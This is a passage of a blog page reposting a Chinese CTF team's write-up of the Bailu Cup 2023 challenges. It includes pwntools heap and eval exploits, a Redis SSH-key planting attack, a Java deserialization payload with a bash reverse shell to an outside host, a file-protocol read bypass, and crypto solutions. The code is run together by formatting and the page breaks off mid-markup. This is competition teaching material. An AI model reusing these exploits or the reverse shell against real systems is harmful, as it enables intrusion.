@@ -1,0 +1,272 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>柏鹭杯2023 WP -Polaris战队 | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="柏鹭杯2023 Polaris战队综合WP：PWN+Redis SSH公钥+Java反序列化+Express file协议+RSA连分数+维吉尼亚">
+<meta property="og:type" content="article">
+<meta property="og:title" content="柏鹭杯2023 WP -Polaris战队">
+<meta property="og:url" content="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Pwn/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023_WP_-Polaris%E6%88%98%E9%98%9F/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="柏鹭杯2023 Polaris战队综合WP：PWN+Redis SSH公钥+Java反序列化+Express file协议+RSA连分数+维吉尼亚">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="PWN eval&#x2F;heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Pwn/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023_WP_-Polaris%E6%88%98%E9%98%9F/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '柏鹭杯2023 WP -Polaris战队',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">柏鹭杯2023 WP -Polaris战队</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-31T16:00:00.000Z" title="发表于 2023-01-01 00:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-31T16:00:00.000Z" title="更新于 2023-01-01 00:00:00">2023-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="柏鹭杯2023 WP -Polaris战队"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/139080.html">https://www.ctfiot.com/139080.html</a><br>ID: 139080</p>
+</blockquote>
+<p>本次柏鹭杯 2023，我们Polaris战队排名第7。</p>
+<p>01</p>
+<p>PWN</p>
+<ol>
+<li></li>
+</ol>
+<p>eval</p>
+<p>#!&#x2F;usr&#x2F;bin&#x2F;env python3</p>
+<h1 id="coding"><a href="#coding" class="headerlink" title="-*- coding:"></a>-*- coding:</h1><p>utf-8 -*-<br>from pwn import *context.clear(arch&#x3D;’amd64’, os&#x3D;’linux’, log_level&#x3D;’debug’)<br>sh &#x3D; remote(‘8.130.120.45’, 32199)sh.sendline(b’+52’)libc_addr &#x3D; int(sh.recvline()) - 0x24083success(‘libc_addr: ‘ + hex(libc_addr))sh.sendline(f’+54-{libc_addr + 0x52290}’.encode())sh.recvline()sh.sendline(f’+53-{libc_addr + 0x0000000000054310}’.encode())sh.recvline()sh.sendline(f’+52-{libc_addr + 0x1b45bd}’.encode())sh.recvline()sh.sendline(f’+51-{libc_addr + 0x0000000000023b6a}’.encode())sh.recvline()sh.sendline()<br>sh.interactive()</p>
+<ol start="2">
+<li></li>
+</ol>
+<p>heap</p>
+<p>#!&#x2F;usr&#x2F;bin&#x2F;env python3</p>
+<h1 id="coding-1"><a href="#coding-1" class="headerlink" title="-*- coding:"></a>-*- coding:</h1><p>utf-8 -*-<br>from pwn import *context.clear(arch&#x3D;’amd64’, os&#x3D;’linux’, log_level&#x3D;’debug’)<br>sh &#x3D; remote(‘8.130.120.45’, 20199)<br>def add(size):    sh.sendlineafter(b’&gt; ‘, b’1’)    sh.sendlineafter(b’size: ‘, str(size).encode())<br>def delete(index):    sh.sendlineafter(b’&gt; ‘, b’2’)    sh.sendlineafter(b’index: ‘, str(index).encode())<br>def edit(index, data):    sh.sendlineafter(b’&gt; ‘, b’3’)    sh.sendlineafter(b’index: ‘, str(index).encode())    sh.sendafter(b’data: ‘, data)<br>def show(index):    sh.sendlineafter(b’&gt; ‘, b’4’)    sh.sendlineafter(b’index: ‘, str(index).encode())<br>add(0x20)add(0x20)add(0x20)add(0x20)delete(1)edit(0, b’a’ * 0x31)show(0)sh.recvuntil(b’a’ * 0x31)guard &#x3D; u64(b’0’ + sh.recvn(7))success(‘guard: ‘ + hex(guard))edit(0, b’a’ * 0x40)show(0)sh.recvuntil(b’a’ * 0x40)heap_addr &#x3D; u64(sh.recvn(6) + b’00’)success(‘heap_addr: ‘ + hex(heap_addr))libc_addr &#x3D; heap_addr + 0xfff50success(‘libc_addr: ‘ + hex(libc_addr))edit(0, b’a’ * 0x30 + p64(guard) + b’a’ * 0x10 + p64(heap_addr+0x2ed5f0-0x28))add(0x20)add(0x20)edit(4, flat([0xfbad3887, 0, 0, 0, libc_addr + 0x1f2570, libc_addr + 0x1f2578, libc_addr + 0x1f2578, libc_addr + 0x1f2578]))image_addr &#x3D;  u64(sh.recvn(8)) - 0x609success(‘image_addr: ‘ + hex(image_addr))<br>delete(1)edit(0, b’a’ * 0x31)show(0)sh.recvuntil(b’a’ * 0x31)guard &#x3D; u64(b’0’ + sh.recvn(7))success(‘guard: ‘ + hex(guard))edit(0, b’a’ * 0x30 + p64(guard) + b’a’ * 0x10 + p64(image_addr+0x2031E8-0x28))add(0x20)add(0x20)edit(5, p64(image_addr + 0xEAD))delete(1)<br>sh.interactive()</p>
+<p>02</p>
+<p>RE</p>
+<ol>
+<li></li>
+</ol>
+<p>rev_imm</p>
+<p>03</p>
+<p>WEB</p>
+<ol>
+<li></li>
+</ol>
+<p>综合7</p>
+<p>在前面通过读取配置文件，可以获得以下信息。</p>
+<p>这里面存在一个redis的服务器，给出了端口号和密码</p>
+<p>..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;share&#x2F;application.properties</p>
+<p>ssh-keygen -t rsa #生成公私钥<br>(echo -e “nn”;cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub;<br>echo -e “nn”)&gt;key.txt #写入<br>cat &#x2F;root&#x2F;.ssh&#x2F;key.txt | proxychains4 redis-cli -h 172.25.0.10 -p 62341  -a de17cb1cfa1a8e8011f027b416775c6a -x set xqq  <br>proxychains redis-cli -h 172.25.0.10 -p 62341 -a de17cb1cfa1a8e8011f027b416775c6a<br>config set dir &#x2F;root&#x2F;.ssh<br>config set dbfilename authorized_keys<br>save<br>proxychains ssh -i id_rsa <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#x37;&#50;&#x2e;&#50;&#53;&#x2e;&#x30;&#x2e;&#x31;&#x30;">&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#x37;&#50;&#x2e;&#50;&#53;&#x2e;&#x30;&#x2e;&#x31;&#x30;</a></p>
+<ol start="2">
+<li></li>
+</ol>
+<p>综合题6</p>
+<p>package com.example.demo;<br>import java.io.ByteArrayOutputStream;<br>import java.io.IOException;<br>import java.io.ObjectOutputStream;<br>import java.util.Base64;<br>public class Test {    public static void main(String[] args) throws IOException {        Ping ping &#x3D; new Ping();        ping.setCommand(“&#x2F;bin&#x2F;bash”);        ping.setArg1(“-c”);        ping.setArg2(“bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;n1ght.cn&#x2F;5555 0&gt;&amp;1”);        ByteArrayOutputStream bao &#x3D; new ByteArrayOutputStream();        new ObjectOutputStream(bao).writeObject(ping);        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));<br>    }}</p>
+<p>反弹shell后</p>
+<p>suid提权dig读取文件</p>
+<ol start="3">
+<li></li>
+</ol>
+<p>express js</p>
+<p>直接读main.js</p>
+<p>flag被waf了，原题</p>
+<p>poc:</p>
+<p>?file[href]&#x3D;aa&amp;file[origin]&#x3D;aa&amp;file[protocol]&#x3D;file:&amp;file[hostname]&#x3D;&amp;file[pathname]&#x3D;%2566lag.txt</p>
+<ol start="4">
+<li></li>
+</ol>
+<p>综合5</p>
+<p>import base64<br>enc_flag1 &#x3D; “UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA&#x3D;&#x3D;”O0O &#x3D; “6925cc02789c1d2552b71acc4a2d48fd”</p>
+<p>def decrypt(encrypted, key):    # Step 1: Base64 decode the encrypted flag    decoded_bytes &#x3D; base64.b64decode(encrypted)    decoded_str &#x3D; decoded_bytes.decode(‘utf-8’)<br>    decrypted &#x3D; []<br>    # Step 2: XOR decryption    for i in range(len(decoded_str)):        decrypted_char &#x3D; chr(ord(decoded_str[i]) ^ ord(key[i % len(key)]))        decrypted.append(decrypted_char)<br>    return ‘’.join(decrypted)</p>
+<p>print(decrypt(enc_flag1, O0O))</p>
+<p>04</p>
+<p>Crypto</p>
+<ol>
+<li></li>
+</ol>
+<p>rsa</p>
+<p>num3&#x3D;1.23389923415003373900567515471436168841941584796842188964423737295914869304653496800649965063081353720701415762591488370228399019899893688681309320356016722276295236528757306976510687729729934668311830828756908988350841843676900575414367123810470585198055372776278588638204471298838884740198056387082949710435502826460830711429956c &#x3D; continued_fraction(num3)alist &#x3D; c.convergents()for i in alist:    a &#x3D; str(i).split(‘&#x2F;‘)    if len(a)&gt;1 and gcd(int(a[0]),int(a[1])) &#x3D;&#x3D; 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(a[0]).bit_length()&#x3D;&#x3D;512 and int(a[1]).bit_length()&#x3D;&#x3D;512:            print(a)   #[‘11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693’, ‘9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517’]</p>
+<p>得到num1，num2</p>
+<p>然后再根据leak &#x3D; pow(p-q, num1, num1*num2)求出p-q</p>
+<p>d &#x3D; inverse_mod(num1, (num1-1)<em>(num2-1))p_q &#x3D; pow(leak,d, num1</em>num2) #p_q &#x3D; 1031221249585875604184791796950952251782528195052531920165093585422640167920112408176595846917625510470783087032532545254805420044855275871408444733261152</p>
+<p>p_q&#x3D;1031221249585875604184791796950952251782528195052531920165093585422640167920112408176595846917625510470783087032532545254805420044855275871408444733261152n&#x3D;61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673<br>e &#x3D; 65537c &#x3D; 31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393<br>var(“p,q”)eq1&#x3D; p-q &#x3D;&#x3D;p_qeq2&#x3D; p*q &#x3D;&#x3D;nsol &#x3D; solve([eq1,eq2], p, q)print(sol)#[p &#x3D;&#x3D; 8397652354751369475047895816963473478350245201262315191356674989898449420511844471318815750077346111978800531467822072132495108840045942922000560423170719, q &#x3D;&#x3D; 7366431105165493870863104020012521226567717006209783271191581404475809252591732063142219903159720601508017444435289526877689688795190667050592115689909567</p>
+<p>from Crypto.Util.number import <em>import gmpy2p &#x3D; 8397652354751369475047895816963473478350245201262315191356674989898449420511844471318815750077346111978800531467822072132495108840045942922000560423170719q &#x3D; 7366431105165493870863104020012521226567717006209783271191581404475809252591732063142219903159720601508017444435289526877689688795190667050592115689909567c&#x3D;31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393e&#x3D;65537m&#x3D;9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517<br>n&#x3D;61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673d&#x3D;gmpy2.invert(e,(p-1)</em>(q-1))m&#x3D;pow(c,d,n)flag&#x3D;m-mprint(long_to_bytes(flag))#b‘flag{ISEC-WeMu5tKe2pOn_70in5And#N3Ver@G1veUp!}’</p>
+<ol start="2">
+<li></li>
+</ol>
+<p>密码2</p>
+<p>爆破出压缩包的密码为i~BgtN_Ld@sw6c9，用ARCHPR爆破得到密文数据的密码为ROT47，密文也应该rot47一下</p>
+<p>附件中主要分析加密函数</p>
+<p>def <em>l(idx, s):    return s[idx:] + s[:<br>idx]def mainProc(p, k1, k2):    s &#x3D; b”abcd07efghij89klmnopqr16stuvwxyz-</em>{}ABCDEFGHIJKL34MNOPQRST25VWXYZ”    t &#x3D; [[_l((i+j)%len(s), s) for j in range(len(s))] for i in range(len(s))]    i1 &#x3D; 0    i2 &#x3D; 0    c &#x3D; b””    for a in p:        c +&#x3D; t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]        i1 &#x3D; (i1 + 1) % len(k1)        i2 &#x3D; (i2 + 1) % len(k2)    return c</p>
+<p>发现就是一个维吉尼亚加密函数，换了表</p>
+<p>k1和k2是同一个key的相反，根据关键加密逻辑</p>
+<p>c +&#x3D; t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]</p>
+<p>只需将key进行处理即可。</p>
+<p>根据flag头可以得到key的10位</p>
+<p>根据题目逻辑写一个回文即可</p>
+<p>def vigeneredecode(enc,key):    mod &#x3D; len(table)    flag &#x3D; ‘’    for i in range(len(enc)):        num1 &#x3D; table.index(enc[i])        num2 &#x3D; table.index(key[i % len(key)])        ans &#x3D; (num1 - num2) % mod        flag +&#x3D; table[ans]    return flag<br>def vigenereencode(enc,key):    mod &#x3D; len(table)    flag &#x3D; ‘’    for i in range(len(enc)):        num1 &#x3D; table.index(enc[i])        num2 &#x3D; table.index(key[i % len(key)])        ans &#x3D; (num1 + num2) % mod        flag +&#x3D; table[ans]    return flag<br>enc &#x3D; ‘6JnsNxHKJ8mkvhS{rMO_c9apMfHDHObq80PMu{<em>ww_r{rq’fleg &#x3D; ‘flag{ISEC-‘table &#x3D; “abcd07efghij89klmnopqr16stuvwxyz-</em>{}ABCDEFGHIJKL34MNOPQRST25VWXYZ”key &#x3D; vigeneredecode(enc,fleg)[:10]print(key)key &#x3D; key + key[::-1]flag &#x3D; vigeneredecode(enc,key)print(flag)#flag{ISEC-Afr1en7_1nN33d_1S_Afr9end_ind88d0o0}</p>
+<p>文末:</p>
+<p>欢迎师傅们加入我们:</p>
+<p>星盟安全团队纳新群1:<br>222328705</p>
+<p>星盟安全团队纳新群2:<br>346014666</p>
+<p>有兴趣的师傅欢迎一起来讨论!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding:</span><br><span class="line">utf-8 -*-</span><br><span class="line">from pwn import *context.clear(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">sh = remote(&#x27;8.130.120.45&#x27;, 32199)sh.sendline(b&#x27;+52&#x27;)libc_addr = int(sh.recvline()) - 0x24083success(&#x27;libc_addr: &#x27; + hex(libc_addr))sh.sendline(f&#x27;+54-&#123;libc_addr + 0x52290&#125;&#x27;.encode())sh.recvline()sh.sendline(f&#x27;+53-&#123;libc_addr + 0x0000000000054310&#125;&#x27;.encode())sh.recvline()sh.sendline(f&#x27;+52-&#123;libc_addr + 0x1b45bd&#125;&#x27;.encode())sh.recvline()sh.sendline(f&#x27;+51-&#123;libc_addr + 0x0000000000023b6a&#125;&#x27;.encode())sh.recvline()sh.sendline()</span><br><span class="line">sh.interactive()</span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding:</span><br><span class="line">utf-8 -*-</span><br><span class="line">from pwn import *context.clear(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">sh = remote(&#x27;8.130.120.45&#x27;, 20199)</span><br><span class="line">def add(size):    sh.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;1&#x27;)    sh.sendlineafter(b&#x27;size: &#x27;, str(size).encode())</span><br><span class="line">def delete(index):    sh.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;2&#x27;)    sh.sendlineafter(b&#x27;index: &#x27;, str(index).encode())</span><br><span class="line">def edit(index, data):    sh.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;3&#x27;)    sh.sendlineafter(b&#x27;index: &#x27;, str(index).encode())    sh.sendafter(b&#x27;data: &#x27;, data)</span><br><span class="line">def show(index):    sh.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;4&#x27;)    sh.sendlineafter(b&#x27;index: &#x27;, str(index).encode())</span><br><span class="line">add(0x20)add(0x20)add(0x20)add(0x20)delete(1)edit(0, b&#x27;a&#x27; * 0x31)show(0)sh.recvuntil(b&#x27;a&#x27; * 0x31)guard = u64(b&#x27;0&#x27; + sh.recvn(7))success(&#x27;guard: &#x27; + hex(guard))edit(0, b&#x27;a&#x27; * 0x40)show(0)sh.recvuntil(b&#x27;a&#x27; * 0x40)heap_addr = u64(sh.recvn(6) + b&#x27;00&#x27;)success(&#x27;heap_addr: &#x27; + hex(heap_addr))libc_addr = heap_addr + 0xfff50success(&#x27;libc_addr: &#x27; + hex(libc_addr))edit(0, b&#x27;a&#x27; * 0x30 + p64(guard) + b&#x27;a&#x27; * 0x10 + p64(heap_addr+0x2ed5f0-0x28))add(0x20)add(0x20)edit(4, flat([0xfbad3887, 0, 0, 0, libc_addr + 0x1f2570, libc_addr + 0x1f2578, libc_addr + 0x1f2578, libc_addr + 0x1f2578]))image_addr =  u64(sh.recvn(8)) - 0x609success(&#x27;image_addr: &#x27; + hex(image_addr))</span><br><span class="line">delete(1)edit(0, b&#x27;a&#x27; * 0x31)show(0)sh.recvuntil(b&#x27;a&#x27; * 0x31)guard = u64(b&#x27;0&#x27; + sh.recvn(7))success(&#x27;guard: &#x27; + hex(guard))edit(0, b&#x27;a&#x27; * 0x30 + p64(guard) + b&#x27;a&#x27; * 0x10 + p64(image_addr+0x2031E8-0x28))add(0x20)add(0x20)edit(5, p64(image_addr + 0xEAD))delete(1)</span><br><span 